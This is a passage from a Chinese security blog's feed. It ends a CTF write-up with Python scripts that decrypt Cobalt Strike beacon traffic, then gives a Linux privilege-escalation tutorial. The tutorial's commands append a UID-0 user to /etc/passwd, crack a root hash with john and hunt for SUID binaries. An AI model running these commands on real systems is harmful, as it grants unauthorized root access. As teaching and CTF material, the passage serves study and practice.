cipher.decrypt(encrypted_data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_path, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fd:</span><br><span class="line">    pobj = javaobj.load(fd)</span><br><span class="line"></span><br><span class="line">PRIVATE_KEY = format_key(pobj.array.value.privateKey.encoded.data)</span><br><span class="line">private_key = RSA.import_key(PRIVATE_KEY.encode())</span><br><span class="line">cipher = PKCS1_v1_5.new(private_key)</span><br><span class="line">ciphertext = cipher.decrypt(base64.b64decode(encode_data), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ciphertext[<span class="number">0</span>:<span class="number">4</span>] == <span class="string">b&#x27;\x00\x00\xBE\xEF&#x27;</span>:</span><br><span class="line">    raw_aes_keys = ciphertext[<span class="number">8</span>:<span class="number">24</span>]</span><br><span class="line">    raw_aes_hash256 = hashlib.sha256(raw_aes_keys).digest()</span><br><span class="line">    aes_key = raw_aes_hash256[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">    hmac_key = raw_aes_hash256[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">SHARED_KEY = binascii.unhexlify(aes_key.<span class="built_in">hex</span>())</span><br><span class="line">HMAC_KEY = binascii.unhexlify(hmac_key.<span class="built_in">hex</span>())</span><br><span class="line"></span><br><span class="line">encrypt_data = base64.b64encode(<span class="built_in">bytes</span>.fromhex(encrypt_data)).decode()</span><br><span class="line">encrypt_data = base64.b64decode(encrypt_data)</span><br><span class="line">encrypt_data_length = <span class="built_in">int</span>.from_bytes(encrypt_data[:<span class="number">4</span>], byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">encrypt_data_l = encrypt_data[<span class="number">4</span>:]</span><br><span class="line">data1 = encrypt_data_l[:encrypt_data_length-<span class="number">16</span>]</span><br><span class="line">signature = encrypt_data_l[encrypt_data_length-<span class="number">16</span>:encrypt_data_length]</span><br><span class="line">iv_bytes = <span class="string">b&quot;abcdefghijklmnop&quot;</span></span><br><span class="line"></span><br><span class="line">dec = decrypt(data1, iv_bytes, signature, SHARED_KEY, HMAC_KEY)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;AES key: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(aes_key.<span class="built_in">hex</span>()))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;HMAC key: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(hmac_key.<span class="built_in">hex</span>()))</span><br><span class="line"><span class="built_in">print</span>(dec[<span class="number">12</span>:<span class="built_in">int</span>.from_bytes(dec[<span class="number">4</span>:<span class="number">8</span>], byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)])</span><br><span class="line"><span class="built_in">print</span>(hexdump.hexdump(dec))</span><br></pre></td></tr></table></figure><p>需要修改的就只有三个：file_path、encode_data、encrypt_data</p><p>同时因为心跳包（<code>submit.php</code>的data）不止一个，需要我们修改脚本里的<code>encrypt_data</code>多次尝试。</p><p>。</p><p>。</p><p>。</p><p><strong>第二种方法：</strong></p><p>这种是一步步来的，分了大概四步</p><p>因为是CTF比赛所以会有<code>.cobaltstrike.beacon_keys</code> 文件，同时该文件本质上为 <code>KeyPair</code> 的 Java 对象，Python 的 <code>javaobj-py3</code> 库可以直接读取里面存储的数据。</p><p>首先，我们需要先获取 <code>.cobaltstrike.beacon_keys</code> 文件中的私钥。这个私钥是 <code>RSA</code> 私钥，用于解密元数据。</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> javaobj.v2 <span class="keyword">as</span> javaobj</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;.cobaltstrike.beacon_keys&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> fd:</span><br><span class="line">    pobj = javaobj.load(fd)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">format_key</span>(<span class="params">key_data, key_type</span>):</span><br><span class="line">    key_data = <span class="built_in">bytes</span>(<span class="built_in">map</span>(<span class="keyword">lambda</span> x: x &amp; <span class="number">0xFF</span>, key_data))</span><br><span class="line">    formatted_key = <span class="string">f&quot;-----BEGIN <span class="subst">&#123;key_type&#125;</span> KEY-----\n&quot;</span></span><br><span class="line">    formatted_key += base64.encodebytes(key_data).decode()</span><br><span class="line">    formatted_key += <span class="string">f&quot;-----END <span class="subst">&#123;key_type&#125;</span> KEY-----&quot;</span></span><br><span class="line">    <span class="keyword">return</span> formatted_key</span><br><span class="line"></span><br><span class="line">privateKey = format_key(pobj.array.value.privateKey.encoded.data, <span class="string">&quot;PRIVATE&quot;</span>)</span><br><span class="line">publicKey = format_key(pobj.array.value.publicKey.encoded.data, <span class="string">&quot;PUBLIC&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(privateKey)</span><br><span class="line"><span class="built_in">print</span>(publicKey)</span><br></pre></td></tr></table></figure><p>然后我们在通过私钥解密元数据、获取 <code>AES KEY</code>，其中 <code>encode_data</code> 为元数据，也就是之前看到的 <code>cookie</code> 的值。</p><p>那什么是AESkey呢？</p><p>因为<code>Cobalt Strike</code> 的 <code>Beacon</code> 通信主要依赖于 <code>AES key</code> 和 <code>HMAC key</code> 。这两个密钥都是由 <code>Beacon</code> 在每次执行时随机生成的 16字节数据。</p><p><code>AES key</code>：这个密钥用于加密和解密 <code>Beacon</code> 与 <code>C2</code> 服务器之间的通信内容。具体来说，它用于 <code>AES</code> 算法，该算法用于加密和解密Beacon任务的传输。</p><p><code>HMAC key</code> ：这个密钥用于验证数据的完整性和真实性。<code>HMAC</code> （Hash-based Message Authentication Code）是一种基于密钥的哈希算法，用于在不安全的通信环境中验证消息的完整性和真实性。</p><p>这两个密钥都是由同一组16字节数据生成的。具体来说，这组16字节数据的 <code>SHA256</code> 哈希的前半部分作为 <code>HMAC</code> 密钥，后半部分作为 <code>AES</code> 密钥。</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hexdump</span><br><span class="line">PRIVATE_KEY = <span class="string">&quot;&quot;&quot;-----BEGIN PRIVATE KEY-----</span></span><br><span class="line"><span class="string">&#123;MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAIzAss/1Vcd49UN5XT+pVELCnX1r</span></span><br><span class="line"><span class="string">To4LhSzcP7sPOrIOQg0onSpKO1tzOVX+2DqtZsSFoFrAmrEV+gZCbFfhYR9vs5DGLUg9aa0i5Gqh</span></span><br><span class="line"><span class="string">Pz/s4v5wcmgUgfnvjh4oK7yPQ5BMcqESCjEim9MXs70by1U7ZN+wOYZEorInV9gPkCJdAgMBAAEC</span></span><br><span class="line"><span class="string">gYAJbRpMjQyamEIsq6MQEWIAOpJbhOU05BaeI33tJB71L7lCslacL258OGI9nRyUCWrZfG15xm5V</span></span><br><span class="line"><span class="string">r7gX1Tj2RbTAUZmGigY1X2rCyz00DFjj5iIQVWsl8eSI1EmjFmQ+rYnCezQcrt4V3c7BZtW9RjFW</span></span><br><span class="line"><span class="string">vHh09PF808Yl4/+++vrMoQJBAKhCa/adRGEFqiVcSZG2FdlUG4bPMfwRkYMERZG5D6fjVHOVNEyL</span></span><br><span class="line"><span class="string">3MK+EtafnYIDD1IS+97K0cbg922RKXNdv+kCQQDWJk0kNe8ePBpwJU4slig1Y+4VWuwTRz6r+MNp</span></span><br><span class="line"><span class="string">v+WrVMzo/LHzAKYn87pyAdxLaZyKAFKs86WpJ2n93ZslC9pVAkA0KMMHJCF6YiMoib9UqDmFsYkG</span></span><br><span class="line"><span class="string">9VvtZBTTpJNcZR3xUYtweSRJRmIdDIcSeVB+aSxqqO/jVMRK/po1IPbUiI9hAkEAi93wPFpNlv3C</span></span><br><span class="line"><span class="string">dsSmzlA0asqd0azUy7KYqFGNsB/5rXFxdCq3PvOJkkaJ27SDYW3VI/0aAoQQCu8HNxvqHMQlEQJB</span></span><br><span class="line"><span class="string">AIFIkfpeSfksLu8NgiFvZsTV8EWF9PfF2VLyqeSGtmySujqb0HbxGnM9SDc0k48wOvIn5YGJPyY2</span></span><br><span class="line"><span class="string">ddsyNI6XbCU=&#125;</span></span><br><span class="line"><span class="string">-----END PRIVATE KEY-----&quot;&quot;&quot;</span></span><br><span class="line"><span class="comment">#rsa私钥</span></span><br><span class="line"></span><br><span class="line">encode_data = <span class="string">&quot;U8jm3+oqzYLuUiRd9F3s7xVz7fGnHQYIKF9ch6GRseWfcBSSk+aGhWP3ZUyHIkwRo1/oDCcKV7LYAp022rCm9bC7niOgMlsvgLRolMKIz+Eq5hCyQ0QVScH8jDYsJsCyVw1iaTf5a7gHixIDrSbTp/GiPQIwcTNZBXIJrll540s=&quot;</span></span><br><span class="line"><span class="comment">#元数据</span></span><br><span class="line"></span><br><span class="line">private_key = RSA.import_key(PRIVATE_KEY.encode())</span><br><span class="line"></span><br><span class="line">cipher = PKCS1_v1_5.new(private_key)</span><br><span class="line">ciphertext = cipher.decrypt(base64.b64decode(encode_data), <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ciphertext[<span class="number">0</span>:<span class="number">4</span>] == <span class="string">b&#x27;\x00\x00\xBE\xEF&#x27;</span>:</span><br><span class="line">    raw_aes_keys = ciphertext[<span class="number">8</span>:<span class="number">24</span>]</span><br><span class="line">    raw_aes_hash256 = hashlib.sha256(raw_aes_keys).digest()</span><br><span class="line">    aes_key = raw_aes_hash256[<span class="number">0</span>:<span class="number">16</span>]</span><br><span class="line">    hmac_key = raw_aes_hash256[<span class="number">16</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;AES key: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(aes_key.<span class="built_in">hex</span>()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HMAC key: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(hmac_key.<span class="built_in">hex</span>()))</span><br><span class="line"></span><br><span class="line">    hexdump.hexdump(ciphertext)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>到此我们就得到了 <code>AES key</code> 和 <code>HMAC key</code></p><p>接着要去解密 <code>submit.php</code> 所传递的 Data ，首先我们要先对该串16进制数据进行处理，转字符串后进行 <code>Base64</code> 编码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">encode_data = <span class="string">&#x27;000000c093dff6b2f058ba4231e3900276566441f2bb4c76e5c8480874a4d99df083054a5ea1dd4aea5523c751af7d123ee8e9f2253a5ccdcf54427d147c556b15657ee2607e92b35732f26341bc0a26c58bf2bcf2383ad640641c364159387223360cc16ff3dc14ab1f00e6ee4fb53f5e15b767bd379451d0d7b6f4aeae9db0c3f30f3ef167b7db3e6ac241643ed2513e73f9e9148ebe7afaa122ea75e945c8ab8a816179e43180257bd8be752827dd0de26826d5611ee09391ee5545897dae1d3a9698&#x27;</span></span><br><span class="line"><span class="comment">#任务数据</span></span><br><span class="line"></span><br><span class="line">bytes_data = <span class="built_in">bytes</span>.fromhex(encode_data)</span><br><span class="line">encrypt_data = base64.b64encode(bytes_data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(encrypt_data.decode())</span><br></pre></td></tr></table></figure><p>最终分别填入 <code>SHARED_KEY</code>，<code>HMAC_KEY</code>，<code>encrypt_data</code> 即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hmac</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> hexdump</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">SHARED_KEY = binascii.unhexlify(<span class="string">&quot;ef08974c0b06bd5127e04ceffe12597b&quot;</span>)</span><br><span class="line"><span class="comment">#AES key</span></span><br><span class="line">HMAC_KEY = binascii.unhexlify(<span class="string">&quot;bd87fa356596a38ac3e3bb0b6c3496e9&quot;</span>)</span><br><span class="line"><span class="comment">#HMAC key</span></span><br><span class="line">encrypt_data = <span class="string">&quot;AAAAwJPf9rLwWLpCMeOQAnZWZEHyu0x25chICHSk2Z3wgwVKXqHdSupVI8dRr30SPujp8iU6XM3PVEJ9FHxVaxVlfuJgfpKzVzLyY0G8CibFi/K88jg61kBkHDZBWThyIzYMwW/z3BSrHwDm7k+1P14Vt2e9N5RR0Ne29K6unbDD8w8+8We32z5qwkFkPtJRPnP56RSOvnr6oSLqdelFyKuKgWF55DGAJXvYvnUoJ90N4mgm1WEe4JOR7lVFiX2uHTqWmA==&quot;</span></span><br><span class="line"><span class="comment">#任务数据（解密过的）</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">encrypted_data, iv_bytes, signature, shared_key, hmac_key</span>):</span><br><span class="line">    <span class="keyword">if</span> hmac.new(hmac_key, encrypted_data, digestmod=<span class="string">&quot;sha256&quot;</span>).digest()[:<span class="number">16</span>] != signature:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;message authentication failed&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)</span><br><span class="line">    <span class="keyword">return</span> cipher.decrypt(encrypted_data)</span><br><span class="line"></span><br><span class="line">encrypt_data = base64.b64decode(encrypt_data)</span><br><span class="line">encrypt_data_length = <span class="built_in">int</span>.from_bytes(encrypt_data[:<span class="number">4</span>], byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)</span><br><span class="line">encrypt_data_l = encrypt_data[<span class="number">4</span>:]</span><br><span class="line"></span><br><span class="line">data1 = encrypt_data_l[:encrypt_data_length-<span class="number">16</span>]</span><br><span class="line">signature = encrypt_data_l[encrypt_data_length-<span class="number">16</span>:encrypt_data_length]</span><br><span class="line">iv_bytes = <span class="string">b&quot;abcdefghijklmnop&quot;</span></span><br><span class="line"></span><br><span class="line">dec = decrypt(data1, iv_bytes, signature, SHARED_KEY, HMAC_KEY)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;counter: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>.from_bytes(dec[:<span class="number">4</span>], byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;任务返回长度: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>.from_bytes(dec[<span class="number">4</span>:<span class="number">8</span>], byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;任务输出类型: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">int</span>.from_bytes(dec[<span class="number">8</span>:<span class="number">12</span>], byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)))</span><br><span class="line"><span class="built_in">print</span>(dec[<span class="number">12</span>:<span class="built_in">int</span>.from_bytes(dec[<span class="number">4</span>:<span class="number">8</span>], byteorder=<span class="string">&#x27;big&#x27;</span>, signed=<span class="literal">False</span>)])</span><br><span class="line"><span class="built_in">print</span>(hexdump.hexdump(dec))</span><br></pre></td></tr></table></figure><p>就OK了</p><p><strong>例题</strong>： 2023 SICTF 一起上号不         <strong>解析</strong>： <a href="https://metaviii.github.io/2024/11/Misc-Record/#%E6%9D%82%E9%A2%98">Misc Record | MetaVi</a> （在#杂题那）</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Network </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux提权浅析</title>
      <link href="/2025/01/Linux%E6%8F%90%E6%9D%83%E6%B5%85%E6%9E%90/"/>
      <url>/2025/01/Linux%E6%8F%90%E6%9D%83%E6%B5%85%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h1 id="passwd提权"><a href="#passwd提权" class="headerlink" title="passwd提权"></a>passwd提权</h1><p><code>/etc/passwd</code>和 <code>/etc/shadow</code>文件是 Linux 系统登录认证的关键文件，如果系统运维人员对 <code>passwd</code>或 <code>shadow</code>文件的内容或权限配置有误，则可以被利用来进行系统提权。</p><p>我们先了解一下 <code>/etc/passwd</code>内容的含义：</p><p>Linux 密码信息保存在两个文件中，分别为：<code>/etc/passwd</code>和 <code>/etc/shadow</code></p><p><code>/etc/passwd</code>文件用于保存用户信息，<strong>每一行代表一个用户</strong>，每一行通过冒号 <code>:</code>分为七个部分:</p><ol><li>用户名</li><li>密码，若为 <code>x</code>则表示密码保存在<code>/etc/shadow</code></li><li>UID，0 代表 root</li><li>GID，表示所在组</li><li>描述信息，依次为 Full Name、Room Number、Work Phone、Home Phone 和 Other</li><li>用户主目录</li><li>默认 shell 类型</li></ol><p>例如，假设 <code>/etc/passwd</code>文件中其中一行信息如下：</p><p><img src="1607657766_5fd2e926952afffe8e697.png" alt="1607657766_5fd2e926952afffe8e697"></p><p>其含义解读如下：</p><p>​*用户名：test-user</p><p>​*密码保存在 <code>/etc/shadow</code>中</p><p>​*UID 为 1001</p><p>​*GID 为 1001</p><p>​*描述信息： Full Name [test]: Room Number [11111]: Work Phone [111111-11]: Home Phone [222222-22]: Other [test]</p><p>​*用户主目录为 <code>/home/test-user</code></p><p>​*默认 shell 为 <code>/bin/bash</code></p><p>因此在登陆时候的权限是通过第三个字段 <code>UID</code>和第四个字段 <code>GID</code>确定。其中 <code>UID=0</code>代表 root 用户</p><p><strong>如果我们能够对 <code>/etc/passwd</code>文件内容进行伪造、篡改，那就能很轻易的登录成功并获取任意用户权限。</strong></p><p>所以，获取passwd的写入权限十分重要</p><p>通常来说，通过 <code>/etc/passwd</code>提权的方法有两种：</p><ol><li>如果具有 <code>/etc/passwd</code>的 <strong>w</strong> (写入) 权限，可以直接添加一个 root 权限的用户</li><li>如果 <code>/etc/passwd</code>中存储 root 用户密码哈希，可以使用 john 进行破解</li></ol><h3 id="场景一：-etc-passwd-具有写权限"><a href="#场景一：-etc-passwd-具有写权限" class="headerlink" title="场景一：&#x2F;etc&#x2F;passwd 具有写权限"></a>场景一：&#x2F;etc&#x2F;passwd 具有写权限</h3><p>查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /etc/passwd /etc/shadow</span><br></pre></td></tr></table></figure><p>如果有 <code>--wx--xrwx</code> 意味着我们具有写入权限，接下来我们需要做的就是</p><p><strong>自己构造一行用户数据添加到 passwd 文件中，用户名和密码自定义，并且将 <code>UID</code>设置为 <code>0</code>，此时我们登陆就可以获取 root 权限。</strong></p><p>查看 passwd 文件中 root 用户数据的格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd|grep root</span><br></pre></td></tr></table></figure><p>结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><p>先设置用户名，如syl-passwd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syl-passwd:x:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><p>设置密码，由于密码并不是明文而是经过 hash 算法加密之后的密文字符串，我们使用 <code>openssl</code>套件</p><p>使用 <code>openssl</code>创建一个密码为 pass123 的 linux hash，命令如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">openssl passwd -1 -salt ignite pass123</span><br><span class="line">#-1 ：使用 MD5 hash 算法</span><br><span class="line">#-salt ：对 hash 算法加 &quot;盐&quot;</span><br></pre></td></tr></table></figure><p>计算得到密码$1$ignite$3eTbJm98O9Hz.k1NTdNxe1，接着构造：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">syl-passwd:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><p>添加到passwd</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;syl-passwd:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash&#x27; &gt;&gt; /etc/passwd</span><br><span class="line">#必须使用单引号，不能使用双引号</span><br><span class="line">#使用 &gt;&gt;，而不是 &gt;</span><br></pre></td></tr></table></figure><p>这样即添加成功，也可以再次查看一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd|grep syl-passwd</span><br></pre></td></tr></table></figure><p>接下来su syl-passwd切换到 syl-passwd 用户，密码为 pass123即可拿到权限</p><h3 id="场景二：-etc-passwd-存储用户密码-hash"><a href="#场景二：-etc-passwd-存储用户密码-hash" class="headerlink" title="场景二：&#x2F;etc&#x2F;passwd 存储用户密码 hash"></a>场景二：&#x2F;etc&#x2F;passwd 存储用户密码 hash</h3><p>一样查看读写权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -alh /etc/passwd /etc/shadow</span><br></pre></td></tr></table></figure><p>但是发现权限配置都是正确的，普通用户只具有 <code>/etc/passwd</code>文件的<strong>读</strong>权限。</p><p>接下来查看 <code>/etc/passwd</code>文件的内容：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure><p>结果发现</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$1$ignite$J98A8EVPG1O40.WnwrPEM1:0:0:root:/root:/bin/bash</span><br></pre></td></tr></table></figure><p>中间的$1$ignite$J98A8EVPG1O40.WnwrPEM1即是root的密码哈希值，接下来所做的就是john了</p><p>先将之前获取到的 root 用户 hash 写入文件 hash.txt 中：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;root:$1$ignite$J98A8EVPG1O40.WnwrPEM1:0:0:root:/root:/bin/bash&#x27; &gt; ~/hash.txt</span><br><span class="line"># 此处必须单引号</span><br></pre></td></tr></table></figure><p>然后就john：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john ~/hash.txt</span><br></pre></td></tr></table></figure><p>最后得到密码是hello</p><p>接下来就一样了，su root，提权。</p><h1 id="shadow提权"><a href="#shadow提权" class="headerlink" title="shadow提权"></a>shadow提权</h1><p>shadow提权与passwd类似</p><p>都是获取root密码的哈希值然后进行爆破</p><h1 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h1><p><strong>什么是suid提权？</strong></p><p>SUID是Linux的一种权限机制，具有这种权限的文件会在其执行时，使调用者暂时获得该文件拥有者的权限。所以利用suid提权的核心就是运行root用户所拥有的suid的文件，那么运行该文件的时候就得获得root用户的身份了。</p><p>suid特点是用户运行某个程序时，如果该程序有suid权限，程序运行进程的属主不是发起者，而是程序文件所属的属主。</p><p>linux引入了3个文件来管理用户组：</p><ol><li>&#x2F;etc&#x2F;passwd存放用户信息。</li><li>&#x2F;etc&#x2F;shadow存放用户密码信息。</li><li>&#x2F;etc&#x2F;group存放组信息</li></ol><p>利用原理：在执行过程中，调用者会暂时获得该文件的所有者权限，且该权限只在程序执行的过程中有效。假设可执行文件binexec其属主为root，当以非root身份登录时，如binexec设置了suid权限，就可以在非root身份下运行该可执行文件，可执行文件运行时该进程的权限为root权限。</p><h2 id="如何设置suid"><a href="#如何设置suid" class="headerlink" title="如何设置suid"></a>如何设置suid</h2><p>列出所有文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -al</span><br></pre></td></tr></table></figure><p>设置suid：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod u+s filename #设置suid</span><br><span class="line">chmod u-s filename #去除suid</span><br></pre></td></tr></table></figure><p>如果文件从<code>-rw</code>变成了<code>-rwS</code>说明添加上了suid权限</p><p>注意：</p><ul><li>只有可以执行的二进制程序文件才能设定SUID权限,非二进制文件设置SUID权限没任何意义</li><li>命令执行者要对该程序文件拥有执行(x)权限才能使用</li><li>SUID权限只在该程序执行过程中有效,也就是说身份改变只在程序执行过程中有效</li></ul><p>具有suid权限的二进制可执行文件有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nmap</span><br><span class="line">vim</span><br><span class="line">find</span><br><span class="line">bash</span><br><span class="line">more</span><br><span class="line">less</span><br><span class="line">nano</span><br><span class="line">cp</span><br><span class="line">awk</span><br></pre></td></tr></table></figure><h2 id="如何查找"><a href="#如何查找" class="headerlink" title="如何查找"></a>如何查找</h2><p>查找系统上运行的suid文件，且查找具有root权限的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># /表示从文件系统的顶部（根）开始并找到每个目录</span><br><span class="line"># -perm 表示搜索随后的权限</span><br><span class="line"># -u = s表示查找root用户拥有的文件</span><br><span class="line"># -type表示我们正在寻找的文件类型</span><br><span class="line"># f 表示常规文件，而不是目录或特殊文件</span><br><span class="line"># 2表示该进程的第二个文件描述符，即stderr（标准错误）</span><br><span class="line"># 